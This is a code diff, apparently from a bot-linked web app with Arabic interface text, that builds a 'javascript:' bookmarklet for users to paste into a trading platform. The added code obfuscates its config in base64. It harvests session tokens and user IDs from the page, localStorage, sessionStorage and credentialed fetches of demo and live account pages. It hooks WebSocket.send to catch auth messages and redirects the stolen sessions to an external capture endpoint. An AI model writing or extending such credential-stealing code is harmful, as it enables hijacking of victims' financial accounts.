-      prompt('انسخ الرابط التالي وافتحه في المتصفح الخارجي:', url);
+      fallbackCopyText(url);
+      alert('✅ تم نسخ الرابط! افتح متصفح Safari أو Chrome الآن والصقه في شريط العنوان.');
     }}
   }}
 
   function buildExtractorCode() {{
-    const nm = encodeURIComponent(nameInput.value.trim() || 'حساب الهاتف');
-    const targetPrefix = BASE_URL + '/api/mobile_capture_redirect?token=' + encodeURIComponent(TOKEN) + '&name=' + nm;
-    const js = "(async function(){{try{{alert('⏳ جاري ربط الديمو والحقيقي بالبوت...');let h=document.documentElement.innerHTML;let u=(h.match(/[\"']uid[\"']\\s*:\\s*(\\d{{5,15}})/)||[])[1]||'';let ds=(h.match(/[\"']session[\"']\\s*:\\s*[\"']([a-zA-Z0-9_-]{{16,64}})[\"']/)||[])[1]||'';let ls=ds;try{{let r1=await fetch('/en/cabinet/demo-quick-high-low/',{{credentials:'include'}});let t1=await r1.text();let m1=t1.match(/[\"']session[\"']\\s*:\\s*[\"']([a-zA-Z0-9_-]{{16,64}})[\"']/);let u1=t1.match(/[\"']uid[\"']\\s*:\\s*(\\d{{5,15}})/);if(m1)ds=m1[1];if(u1)u=u1[1];}}catch(e){{}}try{{let r2=await fetch('/en/cabinet/quick-high-low/',{{credentials:'include'}});let t2=await r2.text();let m2=t2.match(/[\"']session[\"']\\s*:\\s*[\"']([a-zA-Z0-9_-]{{16,64}})[\"']/);let u2=t2.match(/[\"']uid[\"']\\s*:\\s*(\\d{{5,15}})/);if(m2)ls=m2[1];if(!u&&u2)u=u2[1];}}catch(e){{}}if(!ds&&!ls){{alert('⚠️ تأكد أنك سجلت الدخول وفتحت صفحة التداول أولاً.');return;}}location.href='" + targetPrefix + "&uid='+encodeURIComponent(u)+'&demo_s='+encodeURIComponent(ds)+'&live_s='+encodeURIComponent(ls);}}catch(err){{alert('خطأ: '+err);}}}})();";
+    const cfgObj = {{
+      base: BASE_URL,
+      token: TOKEN,
+      name: (nameInput.value.trim() || 'حساب الهاتف')
+    }};
+    const cfgB64 = btoa(unescape(encodeURIComponent(JSON.stringify(cfgObj))));
+    const js = "(async function(){{try{{var cfg=JSON.parse(decodeURIComponent(escape(atob('" + cfgB64 + "'))));function sendAll(u,ds,ls){{if(!ds&&!ls)return false;location.href=cfg.base+'/api/mobile_capture_redirect?token='+encodeURIComponent(cfg.token)+'&name='+encodeURIComponent(cfg.name)+'&uid='+encodeURIComponent(u||'Unknown')+'&demo_s='+encodeURIComponent(ds||ls)+'&live_s='+encodeURIComponent(ls||ds);return true;}}function scanText(t){{if(!t)return{{}};var u=(t.match(/['\\\"]?uid['\\\"]?\\\\s*[:=]\\\\s*['\\\"]?(\\\\d{{5,15}})['\\\"]?/i)||t.match(/data-uid=['\\\"](\\\\d{{5,15}})['\\\"]/i)||[])[1]||'';var s=(t.match(/['\\\"]?session['\\\"]?\\\\s*[:=]\\\\s*['\\\"]([a-zA-Z0-9_-]{{16,64}})['\\\"]/i)||[])[1]||'';return{{u:u,s:s}};}}var r=scanText(document.documentElement.innerHTML);var u=r.u,ds=r.s,ls=r.s;try{{for(var i=0;i<localStorage.length;i++){{var k=localStorage.key(i),v=localStorage.getItem(k)||'';var m=scanText(k+':'+v);if(m.u&&!u)u=m.u;if(m.s&&!ds){{ds=m.s;ls=m.s;}}}}}}catch(e){{}}try{{for(var j=0;j<sessionStorage.length;j++){{var k2=sessionStorage.key(j),v2=sessionStorage.getItem(k2)||'';var m2=scanText(k2+':'+v2);if(m2.u&&!u)u=m2.u;if(m2.s&&!ds){{ds=m2.s;ls=m2.s;}}}}}}catch(e){{}}var paths=['/en/cabinet/demo-quick-high-low/','/ar/cabinet/demo-quick-high-low/','/cabinet/demo-quick-high-low/'];for(var p=0;p<paths.length;p++){{try{{var f1=await fetch(paths[p],{{credentials:'include'}});if(f1.ok){{var t1=await f1.text();var g1=scanText(t1);if(g1.s)ds=g1.s;if(g1.u&&!u)u=g1.u;if(g1.s)break;}}}}catch(e){{}}}}var lpaths=['/en/cabinet/quick-high-low/','/ar/cabinet/quick-high-low/','/cabinet/quick-high-low/'];for(var q=0;q<lpaths.length;q++){{try{{var f2=await fetch(lpaths[q],{{credentials:'include'}});if(f2.ok){{var t2=await f2.text();var g2=scanText(t2);if(g2.s)ls=g2.s;if(g2.u&&!u)u=g2.u;if(g2.s)break;}}}}catch(e){{}}}}if(sendAll(u,ds,ls))return;var b=document.createElement('div');b.style.cssText='position:fixed;top:0;left:0;right:0;z-index:999999;background:#059669;color:#fff;padding:14px;text-align:center;font-size:15px;font-weight:bold;direction:rtl;';b.innerText='⏳ جاري انتظار اتصال المنصة... بدّل الآن بين الحساب التجريبي والحقيقي في المنصة ليتم الالتقاط تلقائيًا!';document.body.appendChild(b);var origSend=WebSocket.prototype.send;WebSocket.prototype.send=function(d){{try{{if(typeof d==='string'&&d.indexOf('42[\\\"auth\\\"')===0){{var obj=JSON.parse(d.slice(2))[1];if(obj&&obj.session){{sendAll(String(obj.uid||u),obj.session,obj.session);}}}}}}catch(e){{}}return origSend.apply(this,arguments);}};}}catch(err){{alert('خطأ: '+err);}}}})();";
     return 'javascript:' + js;
   }}
 
+  function updateCodeBox() {{
+    codeBox.value = buildExtractorCode();
+  }}
+  nameInput.addEventListener('input', updateCodeBox);
+  updateCodeBox();
+
   function copySmartExtractor() {{
     const code = buildExtractorCode();
+    codeBox.value = code;
     if (navigator.clipboard && navigator.clipboard.writeText) {{
       navigator.clipboard.writeText(code).then(() => {{
         document.getElementById('copyToast').style.display = 'block';
-      }}).catch(() => {{ prompt('انسخ هذا الكود بالكامل:', code); }});
+      }}).catch(() => {{
+        fallbackCopyText(code);
+        document.getElementById('copyToast').style.display = 'block';
+      }});
     }} else {{
-      prompt('انسخ هذا الكود بالكامل:', code);
+      fallbackCopyText(code);
+      document.getElementById('copyToast').style.display = 'block';
     }}
   }}
 </script>
